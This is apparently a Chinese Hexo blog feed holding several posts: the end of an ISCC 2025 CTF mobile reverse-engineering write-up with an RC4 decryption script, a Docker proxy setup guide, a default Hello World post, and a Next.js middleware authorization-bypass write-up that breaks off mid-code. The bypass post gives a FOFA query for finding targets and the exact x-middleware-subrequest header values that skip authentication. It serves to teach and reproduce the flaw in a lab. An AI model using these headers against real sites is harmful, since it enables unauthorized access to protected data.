得到初始置换后的S表</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 种子密钥key若为字符串，则转成字节串</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(key, <span class="hljs-built_in">str</span>):  <br>        key = key.encode()<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))  <span class="hljs-comment"># 初始化S表</span><br>    <span class="hljs-comment"># 利用K表，对S表进行置换</span><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]  <span class="hljs-comment"># 置换</span><br>    <span class="hljs-keyword">return</span> S  <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_prga</span>(<span class="hljs-params">S, text</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;伪随机生成算法 (PRGA)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    利用S产生伪随机字节流,</span><br><span class="hljs-string">    将伪随机字节流与明文或密文进行异或,完成加密或解密操作</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 待处理文本text若为字符串，则转成字节串</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(text, <span class="hljs-built_in">str</span>):  <br>        text = text.encode()<br>    i = j = <span class="hljs-number">0</span> <br>    result = []  <br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> text:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]  <span class="hljs-comment"># 置换</span><br>        t = (S[i] + S[j]) % <span class="hljs-number">256</span><br>        k = S[t]  <span class="hljs-comment"># 得到密钥字k</span><br>        <span class="hljs-comment"># 将明文或密文与k进行异或,得到处理结果</span><br>        result.append(byte ^ k)  <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><span class="hljs-comment"># 修复：每次使用RC4时都重新初始化S表</span><br>S = rc4_ksa(<span class="hljs-string">&#x27;ExpectoPatronum&#x27;</span>)<br>res = rc4_prga(S, final_cipher)<br><br><span class="hljs-keyword">try</span>:<br>    flag = <span class="hljs-string">&quot;ISCC&#123;&quot;</span> + res.decode() + <span class="hljs-string">&quot;&#125;&quot;</span><br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: Failed to decode the result as UTF-8&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Raw result:&quot;</span>, res)<br></code></pre></td></tr></table></figure><p><img src="/images/ISCC-2025-APP/image-20250517163104555.png" alt="image-20250517163104555"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ISCC&#123;F<span class="hljs-title">@n</span><span class="hljs-title">@$t</span><span class="hljs-title">!cB3</span><span class="hljs-title">@st5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="mobile2-2"><a href="#mobile2-2" class="headerlink" title="mobile2"></a><strong>mobile2</strong></h2><p>1.把apk进行dump操作</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">frida-dexdump -U -<span class="hljs-built_in">n</span> mobile04<br></code></pre></td></tr></table></figure><p>把dump的文件夹拉到jadx</p><p><img src="/images/ISCC-2025-APP/image-20250517171443359.png" alt="image-20250517171443359"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">68</span>, <span class="hljs-number">67</span>, <span class="hljs-number">56</span>, <span class="hljs-number">66</span>, <span class="hljs-number">67</span>, <span class="hljs-number">57</span>, <span class="hljs-number">53</span>, <span class="hljs-number">53</span>, <span class="hljs-number">52</span>, <span class="hljs-number">66</span>, <span class="hljs-number">55</span>, <span class="hljs-number">55</span>, <span class="hljs-number">54</span>, <span class="hljs-number">51</span>, <span class="hljs-number">51</span>, <span class="hljs-number">55</span><br></code></pre></td></tr></table></figure><p>apk解压后 lib文件夹 x86.64拿到三个so</p><p>ida打开Sunday.so</p><p>在Java_com_example_mobile04_MainActivity_getEncryptedSegment </p><p><img src="/images/ISCC-2025-APP/image-20250517173353695.png" alt="image-20250517173353695"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PQwj5DX0ZcRW0jAIBBN6dKlt<br></code></pre></td></tr></table></figure><p><img src="/images/ISCC-2025-APP/image-20250517173959858.png" alt="image-20250517173959858"></p><p>得到第一部分解</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">AZNxjY</span><br></code></pre></td></tr></table></figure><p>2.libMonday.so找到Java_com_example_mobile04_a_checkFlag2 找到异或</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">0x11<br></code></pre></td></tr></table></figure><p><img src="/images/ISCC-2025-APP/image-20250517174801331.png" alt="image-20250517174801331"></p><p>解密assets下X86_64</p><p>解密脚本</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> range(len(<span class="hljs-class"><span class="hljs-keyword">data</span>)):</span><br>    # 步骤<span class="hljs-number">1</span>: 循环左移<span class="hljs-number">2</span>位 (等效于原加密的右移<span class="hljs-number">2</span>位)<br>    <span class="hljs-class"><span class="hljs-keyword">data</span>[i] = (<span class="hljs-title">data</span>[<span class="hljs-title">i</span>] &lt;&lt; 2) | (<span class="hljs-title">data</span>[<span class="hljs-title">i</span>] &gt;&gt; 6)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>[i] &amp;= 0xff  # 确保结果在0-255范围内</span><br><br>    # 步骤<span class="hljs-number">2</span>: 异或操作的逆运算 (相同密钥再次异或即可还原)<br>    <span class="hljs-class"><span class="hljs-keyword">data</span>[i] ^= 0x11</span><br><br>    # 步骤<span class="hljs-number">3</span>: 循环右移<span class="hljs-number">3</span>位 (等效于原加密的左移<span class="hljs-number">3</span>位)<br>    <span class="hljs-class"><span class="hljs-keyword">data</span>[i] = (<span class="hljs-title">data</span>[<span class="hljs-title">i</span>] &gt;&gt; 3) | (<span class="hljs-title">data</span>[<span class="hljs-title">i</span>] &lt;&lt; 5)</span><br>    <span class="hljs-class"><span class="hljs-keyword">data</span>[i] &amp;= 0xff  # 确保结果在0-255范围内</span><br><br><span class="hljs-title">with</span> open(<span class="hljs-string">&quot;dereal&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(bytes(<span class="hljs-class"><span class="hljs-keyword">data</span>))  </span><br></code></pre></td></tr></table></figure><p><img src="/images/ISCC-2025-APP/image-20250517175300463.png" alt="image-20250517175300463"></p><p>ida打开dereal 在check处找到密文和key</p><p><img src="/images/ISCC-2025-APP/image-20250517180429352.png" alt="image-20250517180429352"></p><p><img src="/images/ISCC-2025-APP/image-20250517181301073.png" alt="image-20250517181301073"></p><p>得到第二部分</p><p>3.flag&#x3D;{AZNxjY50ueBWLS}</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ISCC</tag>
      
      <tag>mobile</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker 拉取失败&amp;clash_for_linux丝滑拉取</title>
    <link href="/2025/05/19/docker-%E6%8B%89%E5%8F%96%E5%A4%B1%E8%B4%A5-clash-for-linux%E4%B8%9D%E6%BB%91%E6%8B%89%E5%8F%96/"/>
    <url>/2025/05/19/docker-%E6%8B%89%E5%8F%96%E5%A4%B1%E8%B4%A5-clash-for-linux%E4%B8%9D%E6%BB%91%E6%8B%89%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="docker-拉取失败-clash-for-linux丝滑拉取"><a href="#docker-拉取失败-clash-for-linux丝滑拉取" class="headerlink" title="docker 拉取失败???&amp;clash_for_linux丝滑拉取"></a><strong>docker 拉取失败</strong>???&amp;<strong>clash_for_linux</strong>丝滑拉取</h1><h2 id="clash安装"><a href="#clash安装" class="headerlink" title="clash安装"></a>clash安装</h2><p>详情：为了解决docker拉取镜像失败，让docker yml走代理，从而有了这篇文章</p><p>设备：ubuntu22</p><p>deb文件：<a href="https://github.com/clash-verge-rev/clash-verge-rev">clash-verge-rev&#x2F;clash-verge-rev：基于 Tauri 的现代 GUI 客户端，旨在在 Windows、macOS 和 Linux 中运行，以提供定制的代理体验</a></p><h3 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h3><h4 id="1-安装deb"><a href="#1-安装deb" class="headerlink" title="1.安装deb"></a>1.安装deb</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> dpkg -i Clash.Verge_2.<span class="hljs-number">2</span>.<span class="hljs-number">3</span>_amd64.deb<br></code></pre></td></tr></table></figure><p>有可能会出现缺少依赖的情况，使用下面的命令进行修复</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sudo apt <span class="hljs-attr">--fix-broken</span> install -<span class="hljs-attribute">y</span><br>sudo apt install flatpak -<span class="hljs-attribute">y</span><br>sudo dpkg -<span class="hljs-selector-tag">i</span> Clash<span class="hljs-selector-class">.Verge_2</span>.<span class="hljs-number">2.3</span>_amd64.deb<br></code></pre></td></tr></table></figure><h4 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h4><p>可以在应用点击打开了此时</p><p><img src="/images/docker-%E6%8B%89%E5%8F%96%E5%A4%B1%E8%B4%A5-clash-for-linux%E4%B8%9D%E6%BB%91%E6%8B%89%E5%8F%96/image-20250515100436736.png" alt="image-20250515100436736"></p><p>注意：如果导入失败，不一定是订阅链接问题，可以把你的购买机场地址放入浏览器，在里面点击导入clash</p><p><img src="/images/docker-%E6%8B%89%E5%8F%96%E5%A4%B1%E8%B4%A5-clash-for-linux%E4%B8%9D%E6%BB%91%E6%8B%89%E5%8F%96/image-20250515100912886.png" alt="image-20250515100912886"></p><h4 id="3-启动"><a href="#3-启动" class="headerlink" title="3.启动"></a>3.启动</h4><p>clash打开首页下拉打开系统代理，并且把网络代理设置成clash代理</p><p><img src="/images/docker-%E6%8B%89%E5%8F%96%E5%A4%B1%E8%B4%A5-clash-for-linux%E4%B8%9D%E6%BB%91%E6%8B%89%E5%8F%96/image-20250515101233442.png" alt="image-20250515101233442"></p><h2 id="docker配置文件修改"><a href="#docker配置文件修改" class="headerlink" title="docker配置文件修改"></a>docker配置文件修改</h2><p>进入到你要拉取的镜像的目录。</p><p>编辑docker-compose.yml</p><p>加上下面缺失代码，让镜像拉取走代理</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">build:</span><br><span class="hljs-symbol">  context:</span> .<br><span class="hljs-symbol">  network:</span> host                <span class="hljs-meta"># 使用宿主网络，继承 Clash 代理和 DNS</span><br><span class="hljs-symbol">  args:</span><br><span class="hljs-symbol">    HTTP_PROXY:</span> <span class="hljs-string">&quot;http://127.0.0.1:7897&quot;</span>    <span class="hljs-meta"># Clash HTTP 代理端口，请与 Clash Verge 中“混合代理端口”保持一致</span><br><span class="hljs-symbol">    HTTPS_PROXY:</span> <span class="hljs-string">&quot;http://127.0.0.1:7897&quot;</span>   <span class="hljs-meta"># Clash HTTPS 代理端口</span><br></code></pre></td></tr></table></figure><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p><strong>看起来很简单是吧。真是花了我两天去搞，一开始不是走代理，就是简单修改dockerfile和dockercompose.后面发现依旧不理想，甚至让我到了抓狂的地步。好吧，也没有那么夸张。后面尝试了利用走梯子，其中首先遇到了命令方式配置，行不通，我的问题吧，反正我是不会。又下载了图形，经过几次的更改后，终于找到极品方法。HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH</strong></p>]]></content>
    
    
    <categories>
      
      <category>乱七八糟</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker拉取失败</tag>
      
      <tag>怎么丝滑拉取镜像</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/05/19/hello-world/"/>
    <url>/2025/05/19/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>next.js-中间件鉴权绕过漏洞</title>
    <link href="/2025/04/10/next.js-%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/04/10/next.js-%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="Next-js-中间件鉴权绕过漏洞"><a href="#Next-js-中间件鉴权绕过漏洞" class="headerlink" title="Next.js 中间件鉴权绕过漏洞"></a>Next.js 中间件鉴权绕过漏洞</h1><h2 id="漏洞基础原理"><a href="#漏洞基础原理" class="headerlink" title="漏洞基础原理"></a>漏洞基础原理</h2><p>Next.js 是一个基于 React 的流行 Web 应用框架，提供服务器端渲染、静态网站生成和集成路由系统等功能。当使用中间件进行身份验证和授权时，Next.js 14.2.25 和 15.2.3 之前的版本存在授权绕过漏洞。</p><p>该漏洞允许攻击者通过操作 <code>x-middleware-subrequest</code> 请求头来绕过基于中间件的安全控制，从而可能获得对受保护资源和敏感数据的未授权访问。</p><h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>&gt;&#x3D; 13.0.0，&lt; 13.5.9 </p><p>&gt;&#x3D; 14.0.0，&lt; 14.2.25</p><p>&gt;&#x3D; 15.0.0，&lt; 15.2.3</p><p>&gt;&#x3D; 11.1.4，&lt; 12.3.5</p><h2 id="对应修补版本"><a href="#对应修补版本" class="headerlink" title="对应修补版本"></a>对应修补版本</h2><p>13.5.9</p><p>14.2.25</p><p>15.2.3</p><p>12.3.5</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="fofa语法："><a href="#fofa语法：" class="headerlink" title="fofa语法："></a>fofa语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">app=&quot;next.js&quot;<br></code></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>需要找到一个目标需要凭证的页面或者目录，用于绕过</p><h3 id="漏洞复现-利用"><a href="#漏洞复现-利用" class="headerlink" title="漏洞复现-利用"></a>漏洞复现-利用</h3><p>我们使用vulhub进行复现 一个基于 Next.js 15.2.2 的存在漏洞的应用</p><h4 id="1-打开网站后强制跳转到登录页面"><a href="#1-打开网站后强制跳转到登录页面" class="headerlink" title="1.打开网站后强制跳转到登录页面"></a>1.打开网站后强制跳转到登录页面</h4><p><img src="/images/next.js/image-20250410083953320.png" alt="image-20250410083953320"></p><h4 id="2-现在进行绕过-我们访问3000端口进行抓包"><a href="#2-现在进行绕过-我们访问3000端口进行抓包" class="headerlink" title="2.现在进行绕过 我们访问3000端口进行抓包"></a>2.现在进行绕过 我们访问3000端口进行抓包</h4><p>在请求头添加 ‘x-middleware-subrequest’ 值为: ‘middleware:middleware:middleware:middleware:middleware’</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">x-middleware-subrequest</span>: <span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:<span class="hljs-attribute">middleware</span>:middleware<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware<br></code></pre></td></tr></table></figure><p><img src="/images/next.js/image-20250410084445621.png" alt="image-20250410084445621"></p><h4 id="进行对比，直接访问响应"><a href="#进行对比，直接访问响应" class="headerlink" title="进行对比，直接访问响应"></a>进行对比，直接访问响应</h4><p><img src="/images/next.js/image-20250410084848558.png" alt="image-20250410084848558"></p><h2 id="漏洞原理剖析"><a href="#漏洞原理剖析" class="headerlink" title="漏洞原理剖析"></a>漏洞原理剖析</h2><h3 id="旧版本绕过-12-2之前"><a href="#旧版本绕过-12-2之前" class="headerlink" title="旧版本绕过-12.2之前"></a>旧版本绕过-12.2之前</h3><p><img src="/images/next.js/image-20250410100131371.png" alt="image-20250410100131371"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 从请求头中获取 &#x27;x-middleware-subrequest&#x27; 字段的值</span><br><span class="hljs-comment">// 该字段可能包含了需要跳过执行的中间件名称列表</span><br><span class="hljs-keyword">const</span> subreq = params.<span class="hljs-property">request</span>.<span class="hljs-property">headers</span>[<span class="hljs-string">`x-middleware-subrequest`</span>];<br><br><span class="hljs-comment">// 判断 subreq 是否为字符串类型</span><br><span class="hljs-comment">// 如果是字符串，则按冒号 &#x27;:&#x27; 分割成数组；如果不是字符串，则将 subrequests 设为空数组</span><br><span class="hljs-comment">// 这样做是为了将可能存在的多个需要跳过的中间件名称解析出来</span><br><span class="hljs-keyword">const</span> subrequests = <span class="hljs-keyword">typeof</span> subreq === <span class="hljs-string">&#x27;string&#x27;</span> ? subreq.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;:&#x27;</span>) : [];<br><br><span class="hljs-comment">// 创建一个新的 Headers 对象 allHeaders，用于存储所有中间件响应头信息</span><br><span class="hljs-comment">// 后续会将各个中间件的有效响应头合并到这个对象中</span><br><span class="hljs-keyword">const</span> allHeaders = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Headers</span>();<br><br><span class="hljs-comment">// 初始化一个变量 result，用于存储中间件执行的结果</span><br><span class="hljs-comment">// 初始值设为 null，在后续中间件执行过程中会被赋值为具体的 FetchEventResult 对象</span><br><span class="hljs-keyword">let</span> <span class="hljs-attr">result</span>: <span class="hljs-title class_">FetchEventResult</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// 遍历中间件列表</span><br><span class="hljs-comment">// this.middleware 是当前服务器实例所配置的中间件数组</span><br><span class="hljs-comment">// 如果 this.middleware 为 null 或 undefined，则使用空数组替代</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> middleware <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">middleware</span> || []) &#123;<br>    <span class="hljs-comment">// 检查当前中间件是否匹配请求的路径</span><br>    <span class="hljs-comment">// middleware.match 是一个函数，用于判断当前中间件是否应该处理该请求</span><br>    <span class="hljs-comment">// params.parsedUrl.pathname 是解析后的请求路径</span><br>    <span class="hljs-keyword">if</span> (middleware.<span class="hljs-title function_">match</span>(params.<span class="hljs-property">parsedUrl</span>.<span class="hljs-property">pathname</span>)) &#123;<br>        <span class="hljs-comment">// 检查当前中间件对应的边缘函数是否存在</span><br>        <span class="hljs-comment">// hasMiddleware 是一个异步函数，用于验证指定页面的中间件是否存在</span><br>        <span class="hljs-comment">// middleware.page 是中间件对应的页面路径，middleware.ssr 表示是否为服务端渲染</span><br>        <span class="hljs-keyword">if</span> (!(<span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">hasMiddleware</span>(middleware.<span class="hljs-property">page</span>, middleware.<span class="hljs-property">ssr</span>))) &#123;<br>            <span class="hljs-comment">// 如果中间件对应的边缘函数不存在，打印警告信息</span><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`The Edge Function for <span class="hljs-subst">$&#123;middleware.page&#125;</span> was not found`</span>);<br>            <span class="hljs-comment">// 跳过当前中间件，继续处理下一个中间件</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 确保中间件已准备好执行</span><br>        <span class="hljs-comment">// ensureMiddleware 是一个异步函数，用于确保指定页面的中间件可以正常执行</span><br>        <span class="hljs-comment">// 可能会涉及到加载中间件代码、初始化环境等操作</span><br>        <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensureMiddleware</span>(middleware.<span class="hljs-property">page</span>, middleware.<span class="hljs-property">ssr</span>);<br><br>        <span class="hljs-comment">// 获取当前中间件的详细信息</span><br>        <span class="hljs-comment">// getMiddlewareInfo 是一个函数，根据传入的配置信息返回中间件的详细信息</span><br>        <span class="hljs-comment">// 包括中间件的名称、路径、环境配置等</span><br>        <span class="hljs-keyword">const</span> middlewareInfo = <span class="hljs-title function_">getMiddlewareInfo</span>(&#123;<br>            <span class="hljs-attr">dev</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">renderOpts</span>.<span class="hljs-property">dev</span>, <span class="hljs-comment">// 是否为开发环境</span><br>            <span class="hljs-attr">distDir</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">distDir</span>, <span class="hljs-comment">// 构建产物目录</span><br>            <span class="hljs-attr">page</span>: middleware.<span class="hljs-property">page</span>, <span class="hljs-comment">// 中间件对应的页面路径</span><br>            <span class="hljs-attr">serverless</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">_isLikeServerless</span>, <span class="hljs-comment">// 是否为无服务器环境</span><br>        &#125;);<br><br>        <span class="hljs-comment">// 检查当前中间件的名称是否在需要跳过的中间件列表中</span><br>        <span class="hljs-comment">// 如果在列表中，说明该中间件不需要执行</span><br>        <span class="hljs-keyword">if</span> (subrequests.<span class="hljs-title function_">includes</span>(middlewareInfo.<span class="hljs-property">name</span>)) &#123;<br>            <span class="hljs-comment">// 创建一个默认的结果对象</span><br>            <span class="hljs-comment">// response 使用 NextResponse.next() 表示继续执行后续操作，不做额外处理</span><br>            <span class="hljs-comment">// waitUntil 是一个 Promise，这里使用 Promise.resolve() 表示立即完成</span><br>            result = &#123;<br>                <span class="hljs-attr">response</span>: <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>(),<br>                <span class="hljs-attr">waitUntil</span>: <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(),<br>            &#125;;<br>            <span class="hljs-comment">// 跳过当前中间件，继续处理下一个中间件</span><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p><code>runMiddleware</code>函数</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 